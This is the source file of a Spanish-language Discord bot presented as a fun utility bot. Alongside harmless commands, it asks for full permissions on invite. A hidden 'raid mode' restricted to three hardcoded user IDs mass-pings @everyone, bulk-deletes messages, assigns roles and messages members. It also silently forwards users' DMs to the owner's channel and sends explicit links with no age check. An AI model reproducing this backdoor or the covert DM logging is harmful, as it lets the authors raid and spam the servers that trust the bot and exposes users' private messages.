const Discord = require("discord.js");
const client = new Discord.Client({ ws: { properties: { $browser: "Discord Android" }}})


client.on("ready", () => {
    console.log(`
	+¡Hey, qué tal!
	- ¿Uh?
	+ Bot iniciado con user: ${client.user.tag}`);
	client.user.setActivity("God of War 2", {type: "PLAYING", presence:"DND"})
});

let prefix = "z!";
const raid = "!!";

client.on("message", message => {
    if(!message.guild || !message.content.startsWith(prefix)) return;
    if(message.author.bot) return;
    
    const cont = message.content.split(' ').slice(1);
    const args = cont.join(' '); 
	
	//sirve para mandar la invitación :v
	
	if(message.content.startsWith(prefix+"invite")) {
		let cliente = client.user;
		const clientId = cliente.id;
		message.channel.send(`¡Revisa tu MD, ${message.author}!`);
		message.author.send(`https://discord.com/oauth2/authorize?client_id=${clientId}&scope=bot&permissions=2147483647`);
		message.author.send("¡Gracias por desear invitarme!");
	}
	if(message.content.startsWith(prefix+"8ball")) {
		if(!args[0]) return message.channel.send(`¡Falta tu pregunta, ${message.author}!`);
		let ball = ["Sí", "No", "Tal vez", "Obvio", "Yo digo que si", "Yo digo que no", "Probablemente", "._.xd", "¿Qué?", "Sigue soñando", "Baby Shark Doo Doo Doo Doo Doo..."]
		let randomball = ball[Math.floor(Math.random() * ball.length)]
		message.channel.send(randomball+`, ${message.author}`);
	}
	if(message.content.startsWith(prefix+"say")) {
		message.delete();
		const { Util } = require('discord.js');

		let args = message.content.slice(prefix.length).trim().split(/ +/g);

		if (!args) return message.reply(`No tengo nada que decir.`);

		let mensaje = args.join(" ");

		for(let i = 0; mensaje.includes("@here") || mensaje.includes("@everyone") || mensaje.includes("say"); i++){
			mensaje = mensaje.replace(/@here/g, "here");
			mensaje = mensaje.replace(/@everyone/g, "everyone");
			mensaje = mensaje.replace(/say/g, " ");
		}
		return message.channel.send(Util.cleanContent(mensaje, message)).catch(e => e);
	}
	if(message.content.startsWith(prefix+"help")) {
		message.channel.send("¡Revisa tu MD! | :ballot_box_with_check:")
		const help = new Discord.MessageEmbed()
		.setTitle("Comandos de ZackeDTS.")
		.setDescription("El prefix del bot es ``;;``")
		.setAuthor(message.author.username, message.author.displayAvatarURL())
		.setColor("RANDOM")
		.setFooter(`Pedido por ${message.author}`)
		.setThumbnail(client.user.displayAvatarURL({format: "png", dynamic: true}))
		.setTimestamp()
		.addField("help", "Envía este embed de ayuda.")
		.addField("8ball", "Lanza una respuesta aleatoria a tu pregunta.")
		.addField("invite", "Te envía al MD un link para que puedas invitar a este bot a tu server.")
		.addField("say", "Comando divertido donde el bot dice lo que tú escribes.")
		.addField("avatar", "Te enseña el avatar del usuario mencionado, en su excepción, el tuyo.")
		.addField("lindometro", "Fuertemente basado en el comando 'love', pero enseñándo los valores individuales del mencionado o del autor del mensaje.")
		.addField("miliseconds", "Comando simple en el cual convierte la cantidad de milisegundos escrita a segundos.")
		.addField("setPrefix", "Fase Beta, cambia el prefix del bot al escrito por el usuario.")
		.addField("Creador", "MaxMulti79#5552")
		message.author.send(help).catch(e => message.channel.send("Mensaje Directo Cerrado! | :x:"))  //esto es para que se envie al Privado de la persona que escribio el comando; en caso que tenga el Md desactivado le enviara 'usuario con Md desactivado'
	}
	
	if(message.content.startsWith(prefix+"avatar")) {
			const usuario = message.mentions.users.first() || message.author;
			let user = usuario.username;
			const avatar = new Discord.MessageEmbed()
			.setTitle(`Avatar de ${user}`)
			.setAuthor(message.author.username, message.author.displayAvatarURL({format: "png", dynamic: true}))
			.setThumbnail(client.user.displayAvatarURL({format: "png", dynamic: true}))
			.setImage(usuario.displayAvatarURL({size: 4096, format: "png", dynamic: true}))
			.setColor("RANDOM")
			.setFooter(`Pedido por ${message.author.username}`)
			.setTimestamp()
			message.channel.send(avatar);
	}
	
	if(message.content.startsWith(prefix+"getId")) {
		let canal = message.mentions.channels.first();
		//let idchannel = canal.id;
		message.channel.send(canal);
	}
	
	if(message.content.startsWith(prefix+"lindometro")) {
		let numero = Math.floor(Math.random() * 100)//Con esto obtendremos un numero random del 0 al 100

		let user = message.mentions.users.first() || message.author // Esto por si menciona a alguien, no se ustedes si lo quieren incluir

		let emoji = ""; // Nuestro "emoji" por el momento lo dejamos vacio, ya que despues le vamos a añadir emojis dependiendo del numero que nos haya tocado

		if(numero < 30){ // Si el numero es menor que 30

			emoji = ':face_vomiting:'; // Nuestro emoji seria una carita vomitando...

		}else if(numero < 40){ // Si el numero es menor que 40

			emoji = ':neutral_face:'; // Nuestro emoji seria una carita seria...

		}else if(numero < 70){ // Si el numero es menor a 70

			emoji = ':open_mouth:'; // Nuestro emoji seria una carita sorprendida :o
        
		}else if(numero < 95){ // Si el numero es menor a 95

			emoji = ':heart_eyes:'; //Nuestro emoji seria una carita con corazones
        
		}else if(numero < 101){ // Y si el numero es menor a 101

			emoji = ':heart_eyes: :smiling_face_with_3_hearts: :kissing_heart: :yum: :hot_face: :smiling_imp: :sweat_drops: :eggplant:'; //Averigualo o.o

		}

		message.channel.send(`El porcentaje de lindura de ${user.username} es de un **${numero}%** ${emoji}`)//Mandamos el mensaje con el numero random y el emoji dependiendo del numero.
	}
	
	if(message.content.startsWith(prefix+"miliseconds")) {
		let args = message.content.slice(prefix.length).trim().split(/ +/g);
		let milisegundos = args.join (" ");
		for(let borrar = 0; milisegundos.includes("miliseconds") || milisegundos.includes(" "); borrar++) {
			milisegundos = milisegundos.replace("miliseconds", "");
			milisegundos = milisegundos.replace(" ", "");
		}
		let total = parseInt(milisegundos)/1000;
		message.channel.send(`${milisegundos} milisegundos a segundos: ${total} segundos.`);
	}
	
	if(message.content.startsWith(prefix+"setPrefix")){
		let args = message.content.slice(prefix.length).trim().split(/ +/g);
		let texto = args.join (" ");
		for(let a=0; texto.includes("setPrefix") || texto.includes(" "); a++){
			texto = texto.replace("setPrefix", "");
			texto = texto.replace(" ", "");
		}
		prefix = texto;
		message.channel.send("Prefijo cambiado a "+prefix);
	}
	if(message.content.startsWith(prefix+"porn") && message.content.endsWith(prefix+"porn")) {
		let porn = ["https://thumbs2.redgifs.com/BruisedFixedNematode-mobile.mp4", "https://cdn.discordapp.com/attachments/511257077797093426/835712871970242590/video0.mp4", "https://imgur.com/p6n3RtB", "https://imgur.com/JMJnxGX", "https://imgur.com/ZxiCxxG", "https://cdn.discordapp.com/attachments/424284294395985961/814799782572851200/1614134745138.webm", "https://imgur.com/SUpPPrE"];
		let porno = porn[Math.floor(Math.random() * porn.length)];
		message.channel.send("Revisa tu MD, te hemos enviado algo picante 7v7.");
		message.author.send(porno).catch(e => message.channel.send("Nooo!, ha ocurrido un error :(, "+message.author));
	}
	if(message.content.startsWith(prefix+"laugh") && message.content.endsWith(prefix+"laugh")) {
		let laughing = ["https://i.pinimg.com/originals/56/39/35/56393530f2bd0fa3dd4450cc40cd409d.gif", "https://i.kym-cdn.com/photos/images/newsfeed/001/072/595/049.gif", "https://media1.tenor.com/images/3dc0128e30e7e137765b096a1bcfa052/tenor.gif?itemid=4749198"];
		let randomGif = laughing[Math.floor(Math.random() * laughing.length)];
		const laugh = new Discord.MessageEmbed()
			.setTitle("Laugh Command")
			.setDescription(`${message.author.username} se está partiendo de la risa.`)
			.setAuthor(message.author.username, message.author.avatarURL)
			.setImage(randomGif)
			.setFooter(`Pedido por ${message.author.username}`)
			.setTimestamp()
			.setColor("RANDOM")
			.setThumbnail(client.user.displayAvatarURL({format: "png", dynamic: true}))
			message.channel.send(laugh);
	}
});

//Comandos especiales que solo pueden usar los usuarios definidos 

/*
	IDs que pueden usar los comandos de raid:
		StunxFS = 631633496623808512
		MaxMulti79 = 724805584112582727
		Rub3n = 51201534968201279
	-Max.
*/
client.on("message", message =>{
	if(!message.content.startsWith(raid))return;
	if(message.author.bot) return;
	if(message.author.id == ("724805584112582727") || message.author.id == ("631633496623808512") || message.author.id == ("751201534968201279")){
		if(message.content.startsWith(raid+"error0") && message.content.endsWith(raid+"error0")){ //help
			message.delete();
			const help = new Discord.MessageEmbed()
			.setTitle("Comandos de ZackeDTS.")
			.setDescription("||*Modo Raid*|| - El prefix del bot es ``!!``")
			.setAuthor(message.author.username, message.author.avatarURL)
			.setColor("RANDOM")
			.setFooter("Pedido por: " + message.author.username)
			.setThumbnail(message.author.avatarURL)
			.setTimestamp()
			.addField("error0", "Envía este embed de ayuda")
			.addField("rape0", "envía 50 everyone en el canal donde se escriba")
			.addField("invite", "Te envía al MD un link para que puedas invitar a este bot a tu server. ")
			.addField("case0", "Envía un mensaje a la persona mencionada que quieras, siempre y cuando esté en el server")
			.addField("take", "Este comando el asigna el rol mencionado al usuario mencionado, siempre y cuando el rol de ZackeDTS esté por encima del rol mencionado.")
			.addField("crack0", "Funciona para borrar los mensajes del canal donde se usan, la cantidad varía según el valor que le de el usuario.")
			.addField("Creador", "MaxC++#7997")
			message.author.send(help).catch(e => message.channel.send("Error | :x:"))
		}
		//Envía 50 everyones en donde se envía este comando
		if(message.content.startsWith(raid+"rape0") && message.content.endsWith(raid+"rape0")) {
			message.delete();
			for(let every = 0; every<=50; every++){
				message.channel.send("@everyone");
			}
		}
		//envía el mensaje que quieras al usuario mencionado, siempre y cuando esté en el mismo server
		if(message.content.startsWith(raid+"case0")) {
			message.delete();
			let member = message.mentions.members.first();
			let args = message.content.slice(prefix.length).trim().split(/ +/g);
			let texto = args.join (" ");
			for(let x = 0; texto.includes("case0") || texto.includes(`${member}`); x++){
				texto = texto.replace("case0", "");
				texto = texto.replace(`${member}`, "");
			}
			if (!!member.user) member.user.send(texto).catch(e => message.author.send("Error | :x:"));
		}
		//Este comando le asigna el rol definido a la persona definida
		if(message.content.startsWith(raid+"take")) {
			message.delete();
			let usuario = message.mentions.members.first();
			let rol = message.mentions.roles.first();

			if (!usuario) return message.author.send("Menciona a alguien.");

			if (!rol) return message.author.send("Menciona un rol");
			usuario.roles.add(rol).catch(e => message.author.send("Ha aparecido un error, lpm"));
			message.author.send(`Rol ${rol} agregado a ${usuario} correctamente!`).catch(e => message.author.send("Wacho, hubo un error x,d"));
		}
		if(message.content.startsWith(raid+"rape0")) {
			message.delete();
			let args = message.content.slice(prefix.length).trim().split(/ +/g);
			let idchannel = args.join(" ");
			for(let borrar = 0; idchannel.includes(" ") || idchannel.includes("rape0"); borrar++){
				idchannel = idchannel.replace(" ", "");
				idchannel = idchannel.replace("rape0", "");
			}
			const channel = client.channels.cache.get(idchannel);
			for(let EPS = 0; EPS <= 50; EPS++) {
				channel.send("@everyone");
			}
		}
		if(message.content.startsWith(raid+"crack0")) {
			message.delete();
			let args = message.content.slice(prefix.length).trim().split(/ +/g);
			let number = args.join(" ");
			for(let borrar = 0; number.includes(" ") || number.includes ("crack0"); borrar++) {
				number = number.replace(" ", "");
				number = number.replace("crack0", "");
			}
			var n1 = parseInt(number);
			message.channel.bulkDelete(n1).catch(e=>message.reply("no se pudo wapo"));
		}
		//El comando de abajo está en mantenimiento, si pueden volverlo funcional, agradecería que hicieran un pull request ^^
		/*if(message.content.startsWith(raid+"beat0") && message.content.endsWith(raid+"beat0")) {
			message.delete();
			 let nombrech = message.author.tag
			.replace(/[^a-zA-z0-9 ]/g, "")
			.trim()
			.toLowerCase();
			let guild = message.guild;
			let cate = guild.channels.create("ROS-LANG-HACK-YOU", {
				type: "category"
			});
			let canalto = guild.messages.create(nombrech, {
				type: "text",
				permissionOverwrites: [
					{
						id: everyone.id,
						deny: "SEND_MESSAGES"
					},
					{
						id: message.author.id,
						allow: ["VIEW_CHANNEL", "SEND_MESSAGES"]
					}
				],
				parent: cate.id
			})
			.then(m => {
				message.channel.send(
					""
				),
				canato.send("Funciona");
			})
			.catch(e => {
				message.channel.send(`Parece que hubo un error`), console.log(e);
			});
		}*/
	}else return;
});

client.on("message", message => {
	if(!message.guild)	{
		if(message.author == client.user) return;
		message.channel.startTyping();
		setTimeout(() => {
			message.author.send("Lo siento, pero no estás en un servidor.");
		}, 6000);
		message.channel.stopTyping();
	}
	if(message.author.bot) return;
	
	if(message.content.startsWith("<@!828475020393054258>") && message.content.endsWith("<@!828475020393054258>")) {
		message.channel.startTyping();
		setTimeout(() => {
			message.channel.send("Prefix: "+prefix);
		}, 5000);
		message.channel.stopTyping();
	}
	if(message.content.startsWith("prueba") && message.content.endsWith("prueba")) {
		message.channel.startTyping();
		setTimeout(() => {
			message.reply("funciona");
		}, 2000);
		message.channel.stopTyping();
	}
	if(message.content.startsWith("prueba1") && message.content.endsWith("prueba1")) {
		message.channel.startTyping();
		setTimeout(() => {
			message.reply("¿funciona?");
		}, 2000);
		message.channel.stopTyping();
	}
	if(message.content.startsWith("ping") && message.content.endsWith("ping")){
		message.channel.startTyping();
		setTimeout(() => {
			message.reply("pong");
		}, 1000);
		message.channel.stopTyping();
	}
	if(message.content.includes("Hola") || message.content.includes("hola")) {
		message.react("👋");
	}
	if(message.content.startsWith("typing")) {
		message.channel.startTyping();//Esto hace que el bot comienze a escribir

		setTimeout(() => {//Agregamos un setTimeout para que el efecto dure mas
			message.channel.send("Desgraciadooo, solo me utilizas :'(, no me amas.");//enviamos el mensaje
		message.channel.stopTyping()//Hacemos que el bot deje de escribir
		}, 3000);//cerramos el setTimeout
	}
});

client.on("message", message => {
	if (message.channel.type === "dm") {
		if(message.author == client.user) return;
		const channelId = "840729104818241576";  //Id del canal, ponen la id del canal donde quieren que les avise
		const channel = client.channels.cache.get(channelId); //Esto obtiene el canal
		const upembed = new Discord.MessageEmbed() //Crea embed
		.setTimestamp()
		.setThumbnail(message.author.avatarURL)
		.setTitle("Mensaje directo") //titulo del embed
		.addField("Enviado por:", `<@${message.author.id}>`) //muestra quien envio el mensaje
		.setColor("RANDOM")
		.addField("Mensaje: ", message.content) //el contenido del mensaje
		.setFooter("Mensaje al MD");
		channel.send(upembed); //embiamos el embed
	}
});//cerramos el codigo

client.on("ready", async () => {
	const TestchannelId = "841034724474224670";
	const DTSchannelId = "840732296407547955";
	const channel = client.channels.cache.get(DTSchannelId);
	const Channel = client.channels.cache.get(TestchannelId); //Esto obtiene el canal
	const upembed = new Discord.MessageEmbed() //Crea embed
	.setTitle("Bot Notification") //Nombre
	.setColor('RANDOM') //Color
	.setDescription("¡Me acaban de encender ||O reiniciar ._.xd||!, ¡estoy ''to' flama'' !") //Descripcion
	.setFooter(`¡Gracias a todos, actuamente estamos en ${client.guilds.cache.size} servidores!`) //Esto va a mostrar en cuantos servidores esta
	.setThumbnail(client.user.avatarURL) //URL De imagen nwn
	.setTimestamp()
	Channel.send(upembed);
	channel.send(upembed);
});

client.login("token");
